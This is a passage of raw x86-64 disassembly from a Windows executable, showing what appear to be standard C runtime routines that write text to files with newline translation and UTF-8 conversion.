   14000a9d6:	c6 03 0d             	movb   $0xd,(%rbx)
   14000a9d9:	48 ff c3             	inc    %rbx
   14000a9dc:	88 03                	mov    %al,(%rbx)
   14000a9de:	48 ff c3             	inc    %rbx
   14000a9e1:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   14000a9e8:	00 
   14000a9e9:	48 3b d8             	cmp    %rax,%rbx
   14000a9ec:	72 d7                	jb     0x14000a9c5
   14000a9ee:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a9f4:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000a9f9:	2b d8                	sub    %eax,%ebx
   14000a9fb:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000aa00:	44 8b c3             	mov    %ebx,%r8d
   14000aa03:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000aa08:	49 8b ce             	mov    %r14,%rcx
   14000aa0b:	ff 15 07 37 00 00    	call   *0x3707(%rip)        # 0x14000e118
   14000aa11:	85 c0                	test   %eax,%eax
   14000aa13:	74 12                	je     0x14000aa27
   14000aa15:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000aa19:	01 47 04             	add    %eax,0x4(%rdi)
   14000aa1c:	3b c3                	cmp    %ebx,%eax
   14000aa1e:	72 0f                	jb     0x14000aa2f
   14000aa20:	48 3b f5             	cmp    %rbp,%rsi
   14000aa23:	72 9b                	jb     0x14000a9c0
   14000aa25:	eb 08                	jmp    0x14000aa2f
   14000aa27:	ff 15 63 36 00 00    	call   *0x3663(%rip)        # 0x14000e090
   14000aa2d:	89 07                	mov    %eax,(%rdi)
   14000aa2f:	48 8b c7             	mov    %rdi,%rax
   14000aa32:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000aa39:	00 
   14000aa3a:	48 33 cc             	xor    %rsp,%rcx
   14000aa3d:	e8 8e 21 00 00       	call   0x14000cbd0
   14000aa42:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000aa49:	00 
   14000aa4a:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000aa4e:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000aa52:	49 8b e3             	mov    %r11,%rsp
   14000aa55:	41 5e                	pop    %r14
   14000aa57:	5f                   	pop    %rdi
   14000aa58:	5e                   	pop    %rsi
   14000aa59:	c3                   	ret
   14000aa5a:	cc                   	int3
   14000aa5b:	cc                   	int3
   14000aa5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000aa61:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000aa66:	56                   	push   %rsi
   14000aa67:	57                   	push   %rdi
   14000aa68:	41 56                	push   %r14
   14000aa6a:	b8 50 14 00 00       	mov    $0x1450,%eax
   14000aa6f:	e8 1c 23 00 00       	call   0x14000cd90
   14000aa74:	48 2b e0             	sub    %rax,%rsp
   14000aa77:	48 8b 05 c2 d5 00 00 	mov    0xd5c2(%rip),%rax        # 0x140018040
   14000aa7e:	48 33 c4             	xor    %rsp,%rax
   14000aa81:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   14000aa88:	00 
   14000aa89:	4c 63 d2             	movslq %edx,%r10
   14000aa8c:	48 8b f9             	mov    %rcx,%rdi
   14000aa8f:	49 8b c2             	mov    %r10,%rax
   14000aa92:	41 8b e9             	mov    %r9d,%ebp
   14000aa95:	48 c1 f8 06          	sar    $0x6,%rax
   14000aa99:	48 8d 0d 50 e7 00 00 	lea    0xe750(%rip),%rcx        # 0x1400191f0
   14000aaa0:	41 83 e2 3f          	and    $0x3f,%r10d
   14000aaa4:	49 03 e8             	add    %r8,%rbp
   14000aaa7:	49 8b f0             	mov    %r8,%rsi
   14000aaaa:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000aaae:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000aab2:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000aab7:	33 c0                	xor    %eax,%eax
   14000aab9:	48 89 07             	mov    %rax,(%rdi)
   14000aabc:	89 47 08             	mov    %eax,0x8(%rdi)
   14000aabf:	4c 3b c5             	cmp    %rbp,%r8
   14000aac2:	0f 83 82 00 00 00    	jae    0x14000ab4a
   14000aac8:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000aacd:	48 3b f5             	cmp    %rbp,%rsi
   14000aad0:	73 31                	jae    0x14000ab03
   14000aad2:	0f b7 06             	movzwl (%rsi),%eax
   14000aad5:	48 83 c6 02          	add    $0x2,%rsi
   14000aad9:	66 83 f8 0a          	cmp    $0xa,%ax
   14000aadd:	75 10                	jne    0x14000aaef
   14000aadf:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   14000aae3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000aae8:	66 89 0b             	mov    %cx,(%rbx)
   14000aaeb:	48 83 c3 02          	add    $0x2,%rbx
   14000aaef:	66 89 03             	mov    %ax,(%rbx)
   14000aaf2:	48 83 c3 02          	add    $0x2,%rbx
   14000aaf6:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   14000aafd:	00 
   14000aafe:	48 3b d8             	cmp    %rax,%rbx
   14000ab01:	72 ca                	jb     0x14000aacd
   14000ab03:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000ab09:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000ab0e:	48 2b d8             	sub    %rax,%rbx
   14000ab11:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000ab16:	48 d1 fb             	sar    $1,%rbx
   14000ab19:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000ab1e:	03 db                	add    %ebx,%ebx
   14000ab20:	49 8b ce             	mov    %r14,%rcx
   14000ab23:	44 8b c3             	mov    %ebx,%r8d
   14000ab26:	ff 15 ec 35 00 00    	call   *0x35ec(%rip)        # 0x14000e118
   14000ab2c:	85 c0                	test   %eax,%eax
   14000ab2e:	74 12                	je     0x14000ab42
   14000ab30:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000ab34:	01 47 04             	add    %eax,0x4(%rdi)
   14000ab37:	3b c3                	cmp    %ebx,%eax
   14000ab39:	72 0f                	jb     0x14000ab4a
   14000ab3b:	48 3b f5             	cmp    %rbp,%rsi
   14000ab3e:	72 88                	jb     0x14000aac8
   14000ab40:	eb 08                	jmp    0x14000ab4a
   14000ab42:	ff 15 48 35 00 00    	call   *0x3548(%rip)        # 0x14000e090
   14000ab48:	89 07                	mov    %eax,(%rdi)
   14000ab4a:	48 8b c7             	mov    %rdi,%rax
   14000ab4d:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000ab54:	00 
   14000ab55:	48 33 cc             	xor    %rsp,%rcx
   14000ab58:	e8 73 20 00 00       	call   0x14000cbd0
   14000ab5d:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000ab64:	00 
   14000ab65:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000ab69:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000ab6d:	49 8b e3             	mov    %r11,%rsp
   14000ab70:	41 5e                	pop    %r14
   14000ab72:	5f                   	pop    %rdi
   14000ab73:	5e                   	pop    %rsi
   14000ab74:	c3                   	ret
   14000ab75:	cc                   	int3
   14000ab76:	cc                   	int3
   14000ab77:	cc                   	int3
   14000ab78:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ab7d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000ab82:	56                   	push   %rsi
   14000ab83:	57                   	push   %rdi
   14000ab84:	41 54                	push   %r12
   14000ab86:	41 56                	push   %r14
   14000ab88:	41 57                	push   %r15
   14000ab8a:	b8 70 14 00 00       	mov    $0x1470,%eax
   14000ab8f:	e8 fc 21 00 00       	call   0x14000cd90
   14000ab94:	48 2b e0             	sub    %rax,%rsp
   14000ab97:	48 8b 05 a2 d4 00 00 	mov    0xd4a2(%rip),%rax        # 0x140018040
   14000ab9e:	48 33 c4             	xor    %rsp,%rax
   14000aba1:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   14000aba8:	00 
   14000aba9:	4c 63 d2             	movslq %edx,%r10
   14000abac:	48 8b d9             	mov    %rcx,%rbx
   14000abaf:	49 8b c2             	mov    %r10,%rax
   14000abb2:	45 8b f1             	mov    %r9d,%r14d
   14000abb5:	48 c1 f8 06          	sar    $0x6,%rax
   14000abb9:	48 8d 0d 30 e6 00 00 	lea    0xe630(%rip),%rcx        # 0x1400191f0
   14000abc0:	41 83 e2 3f          	and    $0x3f,%r10d
   14000abc4:	4d 03 f0             	add    %r8,%r14
   14000abc7:	4d 8b f8             	mov    %r8,%r15
   14000abca:	49 8b f8             	mov    %r8,%rdi
   14000abcd:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000abd1:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000abd5:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   14000abda:	33 c0                	xor    %eax,%eax
   14000abdc:	48 89 03             	mov    %rax,(%rbx)
   14000abdf:	4d 3b c6             	cmp    %r14,%r8
   14000abe2:	89 43 08             	mov    %eax,0x8(%rbx)
   14000abe5:	0f 83 ce 00 00 00    	jae    0x14000acb9
   14000abeb:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000abf0:	49 3b fe             	cmp    %r14,%rdi
   14000abf3:	73 2d                	jae    0x14000ac22
   14000abf5:	0f b7 0f             	movzwl (%rdi),%ecx
   14000abf8:	48 83 c7 02          	add    $0x2,%rdi
   14000abfc:	66 83 f9 0a          	cmp    $0xa,%cx
   14000ac00:	75 0c                	jne    0x14000ac0e
   14000ac02:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000ac07:	66 89 10             	mov    %dx,(%rax)
   14000ac0a:	48 83 c0 02          	add    $0x2,%rax
   14000ac0e:	66 89 08             	mov    %cx,(%rax)
   14000ac11:	48 83 c0 02          	add    $0x2,%rax
   14000ac15:	48 8d 8c 24 f8 06 00 	lea    0x6f8(%rsp),%rcx
   14000ac1c:	00 
   14000ac1d:	48 3b c1             	cmp    %rcx,%rax
   14000ac20:	72 ce                	jb     0x14000abf0
   14000ac22:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000ac28:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000ac2d:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000ac33:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000ac38:	48 2b c1             	sub    %rcx,%rax
   14000ac3b:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   14000ac42:	00 
   14000ac43:	48 8d 8c 24 00 07 00 	lea    0x700(%rsp),%rcx
   14000ac4a:	00 
   14000ac4b:	48 d1 f8             	sar    $1,%rax
   14000ac4e:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000ac53:	44 8b c8             	mov    %eax,%r9d
   14000ac56:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000ac5b:	33 d2                	xor    %edx,%edx
   14000ac5d:	e8 f2 cb ff ff       	call   0x140007854
   14000ac62:	8b e8                	mov    %eax,%ebp
   14000ac64:	85 c0                	test   %eax,%eax
   14000ac66:	74 49                	je     0x14000acb1
   14000ac68:	33 f6                	xor    %esi,%esi
   14000ac6a:	85 c0                	test   %eax,%eax
   14000ac6c:	74 33                	je     0x14000aca1
   14000ac6e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000ac74:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   14000ac7b:	00 
   14000ac7c:	8b ce                	mov    %esi,%ecx
   14000ac7e:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000ac83:	44 8b c5             	mov    %ebp,%r8d
   14000ac86:	48 03 d1             	add    %rcx,%rdx
   14000ac89:	49 8b cc             	mov    %r12,%rcx
   14000ac8c:	44 2b c6             	sub    %esi,%r8d
   14000ac8f:	ff 15 83 34 00 00    	call   *0x3483(%rip)        # 0x14000e118
   14000ac95:	85 c0                	test   %eax,%eax
   14000ac97:	74 18                	je     0x14000acb1
   14000ac99:	03 74 24 40          	add    0x40(%rsp),%esi
   14000ac9d:	3b f5                	cmp    %ebp,%esi
   14000ac9f:	72 cd                	jb     0x14000ac6e
   14000aca1:	8b c7                	mov    %edi,%eax
   14000aca3:	41 2b c7             	sub    %r15d,%eax
   14000aca6:	89 43 04             	mov    %eax,0x4(%rbx)
   14000aca9:	49 3b fe             	cmp    %r14,%rdi
   14000acac:	e9 34 ff ff ff       	jmp    0x14000abe5
   14000acb1:	ff 15 d9 33 00 00    	call   *0x33d9(%rip)        # 0x14000e090
   14000acb7:	89 03                	mov    %eax,(%rbx)
   14000acb9:	48 8b c3             	mov    %rbx,%rax
   14000acbc:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   14000acc3:	00 
   14000acc4:	48 33 cc             	xor    %rsp,%rcx
   14000acc7:	e8 04 1f 00 00       	call   0x14000cbd0
   14000accc:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   14000acd3:	00 
   14000acd4:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000acd8:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   14000acdc:	49 8b e3             	mov    %r11,%rsp
   14000acdf:	41 5f                	pop    %r15
   14000ace1:	41 5e                	pop    %r14
   14000ace3:	41 5c                	pop    %r12
   14000ace5:	5f                   	pop    %rdi
   14000ace6:	5e                   	pop    %rsi
   14000ace7:	c3                   	ret
   14000ace8:	48 8b c4             	mov    %rsp,%rax
   14000aceb:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000acef:	48 89 78 18          	mov    %rdi,0x18(%rax)
   14000acf3:	4c 89 60 20          	mov    %r12,0x20(%rax)
   14000acf7:	89 48 08             	mov    %ecx,0x8(%rax)
   14000acfa:	41 55                	push   %r13
   14000acfc:	41 56                	push   %r14
   14000acfe:	41 57                	push   %r15
   14000ad00:	48 83 ec 40          	sub    $0x40,%rsp
   14000ad04:	49 8b d9             	mov    %r9,%rbx
   14000ad07:	45 8b e0             	mov    %r8d,%r12d
   14000ad0a:	4c 8b ea             	mov    %rdx,%r13
   14000ad0d:	48 63 f9             	movslq %ecx,%rdi
   14000ad10:	83 ff fe             	cmp    $0xfffffffe,%edi
   14000ad13:	75 1c                	jne    0x14000ad31
   14000ad15:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000ad1a:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   14000ad1f:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000ad24:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   14000ad2b:	00 
   14000ad2c:	e9 bf 00 00 00       	jmp    0x14000adf0
   14000ad31:	85 c9                	test   %ecx,%ecx
   14000ad33:	0f 88 86 00 00 00    	js     0x14000adbf
   14000ad39:	3b 3d b1 e8 00 00    	cmp    0xe8b1(%rip),%edi        # 0x1400195f0
   14000ad3f:	73 7e                	jae    0x14000adbf
   14000ad41:	48 8b c7             	mov    %rdi,%rax
   14000ad44:	4c 8b ff             	mov    %rdi,%r15
   14000ad47:	49 c1 ef 06          	shr    $0x6,%r15
   14000ad4b:	48 8d 15 9e e4 00 00 	lea    0xe49e(%rip),%rdx        # 0x1400191f0
   14000ad52:	83 e0 3f             	and    $0x3f,%eax
   14000ad55:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   14000ad59:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000ad5e:	4a 8b 04 fa          	mov    (%rdx,%r15,8),%rax
   14000ad62:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000ad67:	74 56                	je     0x14000adbf
   14000ad69:	8b cf                	mov    %edi,%ecx
   14000ad6b:	e8 c4 ce ff ff       	call   0x140007c34
   14000ad70:	41 83 ce ff          	or     $0xffffffff,%r14d
   14000ad74:	48 8d 05 75 e4 00 00 	lea    0xe475(%rip),%rax        # 0x1400191f0
   14000ad7b:	4a 8b 04 f8          	mov    (%rax,%r15,8),%rax
   14000ad7f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000ad84:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000ad89:	75 15                	jne    0x14000ada0
   14000ad8b:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000ad8f:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000ad96:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000ad9a:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   14000ad9e:	eb 13                	jmp    0x14000adb3
   14000ada0:	4c 8b cb             	mov    %rbx,%r9
   14000ada3:	45 8b c4             	mov    %r12d,%r8d
   14000ada6:	49 8b d5             	mov    %r13,%rdx
   14000ada9:	8b cf                	mov    %edi,%ecx
   14000adab:	e8 60 00 00 00       	call   0x14000ae10
   14000adb0:	44 8b f0             	mov    %eax,%r14d
   14000adb3:	8b cf                	mov    %edi,%ecx
   14000adb5:	e8 a2 ce ff ff       	call   0x140007c5c
   14000adba:	41 8b c6             	mov    %r14d,%eax
   14000adbd:	eb 34                	jmp    0x14000adf3
   14000adbf:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000adc4:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000adc9:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   14000adce:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000add3:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   14000adda:	00 
   14000addb:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000ade1:	45 33 c9             	xor    %r9d,%r9d
   14000ade4:	45 33 c0             	xor    %r8d,%r8d
   14000ade7:	33 d2                	xor    %edx,%edx
   14000ade9:	33 c9                	xor    %ecx,%ecx
   14000adeb:	e8 7c b4 ff ff       	call   0x14000626c
   14000adf0:	83 c8 ff             	or     $0xffffffff,%eax
   14000adf3:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000adf8:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   14000adfd:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   14000ae02:	48 83 c4 40          	add    $0x40,%rsp
   14000ae06:	41 5f                	pop    %r15
   14000ae08:	41 5e                	pop    %r14
   14000ae0a:	41 5d                	pop    %r13
   14000ae0c:	c3                   	ret
   14000ae0d:	cc                   	int3
   14000ae0e:	cc                   	int3
   14000ae0f:	cc                   	int3
   14000ae10:	40 55                	rex push %rbp
   14000ae12:	53                   	push   %rbx
   14000ae13:	56                   	push   %rsi
   14000ae14:	57                   	push   %rdi
   14000ae15:	41 54                	push   %r12
   14000ae17:	41 55                	push   %r13
   14000ae19:	41 56                	push   %r14
   14000ae1b:	41 57                	push   %r15
   14000ae1d:	48 8b ec             	mov    %rsp,%rbp
   14000ae20:	48 83 ec 68          	sub    $0x68,%rsp
   14000ae24:	33 ff                	xor    %edi,%edi
   14000ae26:	45 8b f8             	mov    %r8d,%r15d
   14000ae29:	4c 63 e1             	movslq %ecx,%r12
   14000ae2c:	49 8b d9             	mov    %r9,%rbx
   14000ae2f:	4c 8b f2             	mov    %rdx,%r14
   14000ae32:	45 85 c0             	test   %r8d,%r8d
   14000ae35:	0f 84 d2 02 00 00    	je     0x14000b10d
   14000ae3b:	48 85 d2             	test   %rdx,%rdx
   14000ae3e:	75 37                	jne    0x14000ae77
   14000ae40:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000ae45:	45 33 c0             	xor    %r8d,%r8d
   14000ae48:	41 89 79 34          	mov    %edi,0x34(%r9)
   14000ae4c:	33 d2                	xor    %edx,%edx
   14000ae4e:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000ae53:	33 c9                	xor    %ecx,%ecx
   14000ae55:	41 c7 41 2c 16 00 00 	movl   $0x16,0x2c(%r9)
   14000ae5c:	00 
   14000ae5d:	45 33 c9             	xor    %r9d,%r9d
   14000ae60:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000ae65:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000ae6a:	e8 fd b3 ff ff       	call   0x14000626c
   14000ae6f:	83 c8 ff             	or     $0xffffffff,%eax
   14000ae72:	e9 98 02 00 00       	jmp    0x14000b10f
   14000ae77:	49 8b c4             	mov    %r12,%rax
   14000ae7a:	48 8d 15 6f e3 00 00 	lea    0xe36f(%rip),%rdx        # 0x1400191f0
   14000ae81:	83 e0 3f             	and    $0x3f,%eax
   14000ae84:	49 8b cc             	mov    %r12,%rcx
   14000ae87:	48 c1 f9 06          	sar    $0x6,%rcx
   14000ae8b:	48 89 4d c8          	mov    %rcx,-0x38(%rbp)
   14000ae8f:	4c 8d 2c c0          	lea    (%rax,%rax,8),%r13
   14000ae93:	48 8b 0c ca          	mov    (%rdx,%rcx,8),%rcx
   14000ae97:	42 0f be 74 e9 39    	movsbl 0x39(%rcx,%r13,8),%esi
   14000ae9d:	8d 46 ff             	lea    -0x1(%rsi),%eax
   14000aea0:	3c 01                	cmp    $0x1,%al
   14000aea2:	77 09                	ja     0x14000aead
   14000aea4:	41 8b c7             	mov    %r15d,%eax
   14000aea7:	f7 d0                	not    %eax
   14000aea9:	a8 01                	test   $0x1,%al
   14000aeab:	74 93                	je     0x14000ae40
   14000aead:	42 f6 44 e9 38 20    	testb  $0x20,0x38(%rcx,%r13,8)
   14000aeb3:	74 0e                	je     0x14000aec3
   14000aeb5:	33 d2                	xor    %edx,%edx
   14000aeb7:	41 8b cc             	mov    %r12d,%ecx
   14000aeba:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   14000aebe:	e8 5d 06 00 00       	call   0x14000b520
   14000aec3:	41 8b cc             	mov    %r12d,%ecx
   14000aec6:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   14000aeca:	e8 45 03 00 00       	call   0x14000b214
   14000aecf:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   14000aed3:	4c 8d 05 16 e3 00 00 	lea    0xe316(%rip),%r8        # 0x1400191f0
   14000aeda:	85 c0                	test   %eax,%eax
   14000aedc:	0f 84 17 01 00 00    	je     0x14000aff9
   14000aee2:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000aee6:	42 38 7c e8 38       	cmp    %dil,0x38(%rax,%r13,8)
   14000aeeb:	0f 8d 08 01 00 00    	jge    0x14000aff9
   14000aef1:	40 38 7b 28          	cmp    %dil,0x28(%rbx)
   14000aef5:	75 13                	jne    0x14000af0a
   14000aef7:	48 8b cb             	mov    %rbx,%rcx
   14000aefa:	e8 a1 a8 ff ff       	call   0x1400057a0
   14000aeff:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   14000af03:	4c 8d 05 e6 e2 00 00 	lea    0xe2e6(%rip),%r8        # 0x1400191f0
   14000af0a:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000af0e:	48 39 b8 38 01 00 00 	cmp    %rdi,0x138(%rax)
   14000af15:	75 0f                	jne    0x14000af26
   14000af17:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000af1b:	42 38 7c e8 39       	cmp    %dil,0x39(%rax,%r13,8)
   14000af20:	0f 84 d3 00 00 00    	je     0x14000aff9
   14000af26:	49 8b 0c d0          	mov    (%r8,%rdx,8),%rcx
   14000af2a:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000af2e:	4a 8b 4c e9 28       	mov    0x28(%rcx,%r13,8),%rcx
   14000af33:	ff 15 e7 32 00 00    	call   *0x32e7(%rip)        # 0x14000e220
   14000af39:	85 c0                	test   %eax,%eax
   14000af3b:	0f 84 ad 00 00 00    	je     0x14000afee
   14000af41:	40 84 f6             	test   %sil,%sil
   14000af44:	0f 84 81 00 00 00    	je     0x14000afcb
   14000af4a:	40 fe ce             	dec    %sil
   14000af4d:	40 80 fe 01          	cmp    $0x1,%sil
   14000af51:	0f 87 3b 01 00 00    	ja     0x14000b092
   14000af57:	4f 8d 24 3e          	lea    (%r14,%r15,1),%r12
   14000af5b:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
   14000af5f:	4d 8b fe             	mov    %r14,%r15
   14000af62:	4d 3b f4             	cmp    %r12,%r14
   14000af65:	0f 83 1d 01 00 00    	jae    0x14000b088
   14000af6b:	8b 75 d4             	mov    -0x2c(%rbp),%esi
   14000af6e:	41 0f b7 07          	movzwl (%r15),%eax
   14000af72:	0f b7 c8             	movzwl %ax,%ecx
   14000af75:	66 89 45 f0          	mov    %ax,-0x10(%rbp)
   14000af79:	e8 aa 05 00 00       	call   0x14000b528
   14000af7e:	0f b7 4d f0          	movzwl -0x10(%rbp),%ecx
   14000af82:	66 3b c1             	cmp    %cx,%ax
   14000af85:	75 36                	jne    0x14000afbd
   14000af87:	83 c6 02             	add    $0x2,%esi
   14000af8a:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000af8d:	66 83 f9 0a          	cmp    $0xa,%cx
   14000af91:	75 1b                	jne    0x14000afae
   14000af93:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000af98:	e8 8b 05 00 00       	call   0x14000b528
   14000af9d:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000afa2:	66 3b c1             	cmp    %cx,%ax
   14000afa5:	75 16                	jne    0x14000afbd
   14000afa7:	ff c6                	inc    %esi
   14000afa9:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000afac:	ff c7                	inc    %edi
   14000afae:	49 83 c7 02          	add    $0x2,%r15
   14000afb2:	4d 3b fc             	cmp    %r12,%r15
   14000afb5:	0f 83 cd 00 00 00    	jae    0x14000b088
   14000afbb:	eb b1                	jmp    0x14000af6e
   14000afbd:	ff 15 cd 30 00 00    	call   *0x30cd(%rip)        # 0x14000e090
   14000afc3:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000afc6:	e9 bd 00 00 00       	jmp    0x14000b088
   14000afcb:	45 8b cf             	mov    %r15d,%r9d
   14000afce:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000afd3:	4d 8b c6             	mov    %r14,%r8
   14000afd6:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000afda:	41 8b d4             	mov    %r12d,%edx
   14000afdd:	e8 ea f4 ff ff       	call   0x14000a4cc
   14000afe2:	f2 0f 10 00          	movsd  (%rax),%xmm0
   14000afe6:	8b 78 08             	mov    0x8(%rax),%edi
   14000afe9:	e9 9f 00 00 00       	jmp    0x14000b08d
   14000afee:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   14000aff2:	4c 8d 05 f7 e1 00 00 	lea    0xe1f7(%rip),%r8        # 0x1400191f0
   14000aff9:	49 8b 0c d0          	mov    (%r8,%rdx,8),%rcx
   14000affd:	42 38 7c e9 38       	cmp    %dil,0x38(%rcx,%r13,8)
   14000b002:	7d 51                	jge    0x14000b055
   14000b004:	8b ce                	mov    %esi,%ecx
   14000b006:	40 84 f6             	test   %sil,%sil
   14000b009:	74 36                	je     0x14000b041
   14000b00b:	83 e9 01             	sub    $0x1,%ecx
   14000b00e:	74 1d                	je     0x14000b02d
   14000b010:	83 f9 01             	cmp    $0x1,%ecx
   14000b013:	0f 85 84 00 00 00    	jne    0x14000b09d
   14000b019:	45 8b cf             	mov    %r15d,%r9d
   14000b01c:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000b020:	4d 8b c6             	mov    %r14,%r8
   14000b023:	41 8b d4             	mov    %r12d,%edx
   14000b026:	e8 31 fa ff ff       	call   0x14000aa5c
   14000b02b:	eb b5                	jmp    0x14000afe2
   14000b02d:	45 8b cf             	mov    %r15d,%r9d
   14000b030:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000b034:	4d 8b c6             	mov    %r14,%r8
   14000b037:	41 8b d4             	mov    %r12d,%edx
   14000b03a:	e8 39 fb ff ff       	call   0x14000ab78
   14000b03f:	eb a1                	jmp    0x14000afe2
   14000b041:	45 8b cf             	mov    %r15d,%r9d
   14000b044:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000b048:	4d 8b c6             	mov    %r14,%r8
   14000b04b:	41 8b d4             	mov    %r12d,%edx
   14000b04e:	e8 05 f9 ff ff       	call   0x14000a958
   14000b053:	eb 8d                	jmp    0x14000afe2
   14000b055:	4a 8b 4c e9 28       	mov    0x28(%rcx,%r13,8),%rcx
   14000b05a:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   14000b05e:	33 c0                	xor    %eax,%eax
   14000b060:	45 8b c7             	mov    %r15d,%r8d
   14000b063:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   14000b068:	49 8b d6             	mov    %r14,%rdx
   14000b06b:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   14000b06f:	89 45 d8             	mov    %eax,-0x28(%rbp)
   14000b072:	ff 15 a0 30 00 00    	call   *0x30a0(%rip)        # 0x14000e118
   14000b078:	85 c0                	test   %eax,%eax
   14000b07a:	75 09                	jne    0x14000b085
   14000b07c:	ff 15 0e 30 00 00    	call   *0x300e(%rip)        # 0x14000e090
   14000b082:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000b085:	8b 7d d8             	mov    -0x28(%rbp),%edi
   14000b088:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   14000b08d:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   14000b092:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
